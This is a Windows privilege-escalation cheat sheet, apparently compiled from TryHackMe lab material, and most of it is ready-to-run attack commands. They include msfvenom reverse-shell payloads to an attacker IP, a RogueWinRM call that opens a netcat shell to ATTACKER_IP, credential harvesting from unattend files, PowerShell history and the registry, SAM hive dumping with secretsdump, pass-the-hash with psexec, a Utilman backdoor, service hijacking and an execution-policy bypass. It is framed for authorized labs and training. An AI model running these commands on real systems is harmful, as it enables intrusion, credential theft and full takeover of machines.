# Windows Privilege Escalation — Practical Cheat Sheet

> **Purpose:** Fast reference for THM/CTF/authorized Windows labs.
> **Core flow:** Identify → Hunt credentials → Check tasks/services → Check privileges → Check software → Automate → Validate → Exploit → Verify.
> Based on the Windows privilege-escalation material previously provided.

---

# 0. FIRST: Get Context

```cmd
whoami
whoami /priv
```

Then identify:

```text
Current user
Groups/context
Assigned privileges
OS/version
Interesting software/services
```

---

# 1. CREDENTIAL HUNTING — QUICK WINS

## Unattended installation files

Check:

```text
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Look for:

```text
Username
Domain
Password
Credentials
```

---

## PowerShell history

From `cmd.exe`:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

From PowerShell:

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Look for:

- Passwords
- Tokens
- Administrative commands
- Credentials in command arguments

---

## Saved credentials

```cmd
cmdkey /list
```

If useful saved credentials exist, investigate authorized reuse:

```cmd
runas /savecred /user:admin cmd.exe
```

---

## IIS

Look for:

```text
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Search connection strings:

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Look for:

```text
Database credentials
Authentication secrets
Passwords
Connection strings
```

---

## PuTTY

Search:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Look for proxy credentials.

> `SimonTatham` is the creator's name and part of the registry path, not the target username.

---

# 2. SCHEDULED TASKS

Enumerate:

```cmd
schtasks
```

Detailed task:

```cmd
schtasks /query /tn <task> /fo list /v
```

Focus on:

```text
Task To Run
Run As User
```

### Then check permissions

```cmd
icacls C:\path\to\task-script.bat
```

### Escalation condition

```text
Privileged scheduled task
        +
Task executable/script is writable
        ↓
Potential privilege escalation
```

### If task can be manually triggered

```cmd
schtasks /run /tn <task>
```

Then:

```cmd
whoami
```

---

# 3. ALWAYSINSTALLELEVATED

Check:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### Required

Both relevant settings must be enabled.

### Lab payload example

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Install:

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

> In the supplied THM material this technique was information-only and did not work on that room's machine.

---

# 4. SERVICES — ALWAYS INVESTIGATE

Query service:

```cmd
sc.exe qc <service>
```

Important fields:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
```

Ask:

```text
What executable?
What account runs it?
Is the path quoted?
Can I modify the executable?
Can I modify the service?
Can I restart it?
```

---

# 5. SERVICE EXECUTABLE PERMISSIONS

Check:

```cmd
icacls C:\path\service.exe
```

High-value findings:

```text
Everyone:(M)
Users:(M)
Writable service executable
```

### Escalation condition

```text
Service runs as privileged user
        +
Executable can be modified/replaced
        ↓
Replace executable
        ↓
Restart service
        ↓
Privileges of service account
```

---

# 6. SERVICE BINARY REPLACEMENT — LAB PATTERN

Generate a service-compatible payload in the authorized lab:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
```

Transfer to target.

Replace vulnerable binary:

```cmd
move vulnerable.exe vulnerable.exe.bkp
move rev-svc.exe vulnerable.exe
```

Check/grant required permissions if appropriate in the lab:

```cmd
icacls vulnerable.exe /grant Everyone:F
```

Restart:

```cmd
sc.exe stop <service>
sc.exe start <service>
```

Verify:

```cmd
whoami
```

---

# 7. UNQUOTED SERVICE PATH

Query:

```cmd
sc.exe qc <service>
```

Look at:

```text
BINARY_PATH_NAME
```

### Vulnerable pattern

```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

instead of:

```text
"C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe"
```

### Candidate parsing

Windows may search candidates such as:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

### But unquoted ≠ automatically exploitable

You also need a writable earlier path.

Check:

```cmd
icacls C:\MyPrograms
```

Look for permissions allowing users to create files/directories.

### Mental model

```text
Unquoted path
      +
Spaces
      +
Writable earlier candidate
      ↓
Potential executable hijacking
```

---

# 8. SERVICE DACL / CONFIGURATION ABUSE

The executable can be protected and the path can be quoted, but the **service itself** may be reconfigurable.

Use AccessChk:

```cmd
C:\tools\AccessChk\accesschk64.exe -qlc <service>
```

Look for:

```text
SERVICE_ALL_ACCESS
```

assigned to your group, e.g.:

```text
BUILTIN\Users
```

### Escalation condition

```text
User can modify service configuration
        ↓
Change executable path
        ↓
Optionally change service account
        ↓
Restart service
        ↓
Higher privilege
```

Example lab syntax:

```cmd
sc.exe config THMService binPath= "C:\Users\<user>\payload.exe" obj= LocalSystem
```

Then:

```cmd
sc.exe stop THMService
sc.exe start THMService
```

Verify:

```cmd
whoami
```

Expected highest context in the supplied example:

```text
NT AUTHORITY\SYSTEM
```

### Important `sc` detail

In PowerShell:

```powershell
sc
```

is an alias for `Set-Content`.

Use:

```powershell
sc.exe
```

for service operations.

---

# 9. DANGEROUS PRIVILEGES

Check:

```cmd
whoami /priv
```

Immediately investigate:

```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

---

# 10. SeBackup / SeRestore

Concept:

```text
SeBackupPrivilege
SeRestorePrivilege
        ↓
Read/write protected files while bypassing normal DACL restrictions
```

One lab route:

```text
Save SAM + SYSTEM
        ↓
Extract local password hashes
        ↓
Pass-the-Hash
        ↓
Administrative access
```

Save hives:

```cmd
reg save hklm\system C:\Users\<user>\system.hive
reg save hklm\sam C:\Users\<user>\sam.hive
```

Extract hashes on attacker machine:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

The source used Impacket's `secretsdump.py`.

### Pass-the-Hash lab pattern

```bash
psexec.py -hashes LMHASH:NTHASH administrator@TARGET_IP
```

Verify:

```cmd
whoami
```

---

# 11. SeTakeOwnershipPrivilege

Check:

```cmd
whoami /priv
```

Core concept:

```text
SeTakeOwnershipPrivilege
        ↓
Take ownership of protected object
        ↓
Assign yourself permissions
        ↓
Modify/replace object
```

### Utilman lab pattern

Take ownership:

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

Grant permissions:

```cmd
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
```

Replace with command shell:

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

Trigger Utilman from the lock screen in the authorized lab.

Verify:

```cmd
whoami
```

Expected lab context:

```text
NT AUTHORITY\SYSTEM
```

> This is a lab technique demonstrating the impact of taking ownership of a SYSTEM-launched executable.

---

# 12. SeImpersonate / SeAssignPrimaryToken

Check:

```cmd
whoami /priv
```

Core concept:

```text
Process has impersonation privilege
        ↓
Privileged user authenticates/connects
        ↓
Process can impersonate that token
        ↓
Potential SYSTEM execution
```

Common accounts that may have these privileges:

```text
LOCAL SERVICE
NETWORK SERVICE
iis apppool\defaultapppool
```

### Required conditions

```text
1. Control/spawn a process users can authenticate to
2. Force/induce a privileged user to authenticate to it
```

---

# 13. RogueWinRM

The supplied lab uses RogueWinRM to abuse impersonation privileges.

Concept:

```text
SeImpersonate / SeAssignPrimaryToken
        +
BITS / WinRM interaction
        ↓
SYSTEM authentication
        ↓
Token impersonation
        ↓
SYSTEM
```

Lab command from the source:

```cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Listener:

```bash
nc -lvp 4442
```

Then verify:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

### Timing

The source notes the exploit may take up to approximately two minutes in the lab because of BITS behavior.

---

# 14. VULNERABLE SOFTWARE

Enumerate software:

```cmd
wmic product get name,version,vendor
```

### Important limitation

WMIC may not list every installed application.

Also inspect:

```text
Desktop shortcuts
Services
Installed application traces
Other software evidence
```

Then research versions for:

```text
CVE
Exploit-DB
Packet Storm
Public repositories
```

---

# 15. DRUVA inSync CASE STUDY

The supplied material covers Druva inSync 6.6.3.

Key facts:

```text
RPC server
Port 6064
SYSTEM privileges
Localhost access
Vulnerable procedure: 5
```

The vulnerable procedure allowed command execution.

A patch attempted to restrict commands to:

```text
C:\ProgramData\Druva\inSync4\
```

but path traversal could bypass the check:

```text
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

### Protocol concept

```text
Hello
  ↓
Procedure number
  ↓
Command length
  ↓
Command
```

### Core lesson

```text
Privileged local service
        +
Command-execution vulnerability
        +
Weak path validation
        ↓
SYSTEM
```

---

# 16. AUTOMATED ENUMERATION

## WinPEAS

Run:

```cmd
winpeas.exe > outputfile.txt
```

Use the output to find:

- Weak permissions
- Credentials
- Services
- Tasks
- Vulnerable software
- Other privilege-escalation paths

---

## PrivescCheck

If execution policy blocks the script in the authorized lab:

```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
```

Load:

```powershell
. .\PrivescCheck.ps1
```

Run:

```powershell
Invoke-PrivescCheck
```

---

## WES-NG

Run on the attacker machine.

On target:

```cmd
systeminfo
```

Save output and transfer it to attacker.

Update database:

```bash
wes.py --update
```

Analyze:

```bash
wes.py systeminfo.txt
```

### Advantage

The enumeration/exploit-suggestion logic runs on the attacker machine, reducing the need to upload a tool binary to the target.

---

## Metasploit

If you have Meterpreter:

```text
multi/recon/local_exploit_suggester
```

Use it to identify potential local vulnerabilities.

---

# 17. FIRST 5-MINUTE TRIAGE

When you first land on Windows:

```text
1. whoami
2. whoami /priv
3. Credential hunting
4. Scheduled tasks
5. Services
6. File/service permissions
7. Unquoted service paths
8. Software + versions
9. Automated enumeration
10. Research vulnerabilities
```

---

# 18. SERVICE TRIAGE ORDER

For every interesting service:

```cmd
sc.exe qc <service>
```

Then:

```text
1. What is BINARY_PATH_NAME?
2. What is SERVICE_START_NAME?
3. Is path quoted?
4. Is executable writable?
5. Is parent directory writable?
6. Can service DACL be modified?
7. Can current user stop/start/restart it?
8. What privilege will the service provide?
```

---

# 19. TASK TRIAGE ORDER

```cmd
schtasks /query /tn <task> /fo list /v
```

Then:

```text
1. Task To Run?
2. Run As User?
3. Is script/executable writable?
4. Is parent directory writable?
5. Can task be triggered?
6. What account do I receive?
```

---

# 20. PRIVILEGE TRIAGE ORDER

```cmd
whoami /priv
```

If you see:

```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

stop and investigate that privilege before spending time elsewhere.

---

# 21. FINDING → QUESTION → ACTION

| Finding | Ask | Next action |
|---|---|---|
| Saved credential | Which account? | Test authorized reuse |
| Unattend password | Is it privileged? | Authenticate/test |
| PowerShell history | Any secrets? | Validate credential |
| Scheduled task | Who runs it? | Check executable permissions |
| Writable task | Can it be triggered? | Validate |
| Service binary writable | Who runs service? | Replace in lab |
| Unquoted service path | Can earlier path be written? | Validate |
| Service DACL | Can I reconfigure? | Inspect with AccessChk |
| Dangerous privilege | Which one? | Apply privilege-specific technique |
| Installed software | Version? | Research CVE |
| Missing patch | Applicable exploit? | Evaluate |
| IIS app pool | SeImpersonate? | Investigate impersonation |
| WinPEAS finding | Is it real? | Manually validate |

---

# 22. PERMISSION READING

Use:

```cmd
icacls <path>
```

Common permissions:

| Permission | Meaning |
|---|---|
| `F` | Full access |
| `M` | Modify |
| `RX` | Read + Execute |
| `AD` | Add subdirectory |
| `WD` | Write data |

Always ask:

```text
WHO has the permission?
WHAT permission?
ON WHICH file/directory/service?
WHO executes the object?
```

---

# 23. WINDOWS ACCOUNT CONTEXT

| Account | Key idea |
|---|---|
| Administrators | Administrative group |
| Standard Users | Limited user access |
| SYSTEM / LocalSystem | Extremely privileged Windows system context |
| Local Service | Low-privilege service account |
| Network Service | Low-privilege service account using machine credentials for network auth |

---

# 24. QUICK DECISION TREE

```text
WHO AM I?
   ↓
whoami / whoami /priv
   ↓
CREDENTIALS?
   ├── Yes → inspect/reuse if authorized
   └── No
        ↓
SCHEDULED TASK?
   ├── Privileged + writable → investigate
   └── No
        ↓
SERVICE?
   ├── Writable binary → investigate
   ├── Unquoted + writable candidate → investigate
   ├── Writable service DACL → investigate
   └── No
        ↓
DANGEROUS PRIVILEGE?
   ├── Backup/Restore → SAM/SYSTEM route
   ├── TakeOwnership → protected-object route
   └── Impersonation → token/RogueWinRM route
        ↓
SOFTWARE?
   ├── Version → CVE/public exploit research
   └── No
        ↓
AUTOMATE
   WinPEAS / PrivescCheck / WES-NG / Metasploit
        ↓
MANUALLY VALIDATE
        ↓
EXPLOIT
        ↓
VERIFY
```

---

# 25. GOLDEN RULES

### Rule 1

> **A finding is not automatically exploitable.**

### Rule 2

> **Always identify who executes the object and under which account.**

### Rule 3

> **Writable + privileged execution is one of the highest-value patterns.**

### Rule 4

> **Unquoted service path requires a writable earlier candidate path.**

### Rule 5

> **Dangerous privileges need privilege-specific validation.**

### Rule 6

> **Automated enumeration finds leads; manual validation confirms them.**

### Rule 7

Always verify:

```cmd
whoami
```

---

# 26. 30-SECOND MEMORY MODEL

```text
WINDOWS PRIVESC

IDENTITY
  whoami / whoami /priv

CREDENTIALS
  Unattend / PS history / cmdkey / IIS / PuTTY

TASKS
  schtasks → Task To Run → Run As User → icacls

SERVICES
  sc.exe qc → binary → account → permissions → DACL

PRIVILEGES
  Backup / Restore
  TakeOwnership
  Impersonate / AssignPrimaryToken

SOFTWARE
  wmic → version → CVE

AUTOMATION
  WinPEAS / PrivescCheck / WES-NG / Metasploit

VERIFY
  whoami
```

---

# 27. FINAL PRACTICAL QUESTION

For **every** interesting finding, ask:

```text
1. What is privileged?
2. Who executes it?
3. Can my current account modify or influence it?
4. What privilege/account will I get?
5. What exact condition is required?
6. Can I verify the result?
```

> **Don't memorize hundreds of exploits. Memorize the patterns, enumeration commands, and questions that lead you to the exploit.**
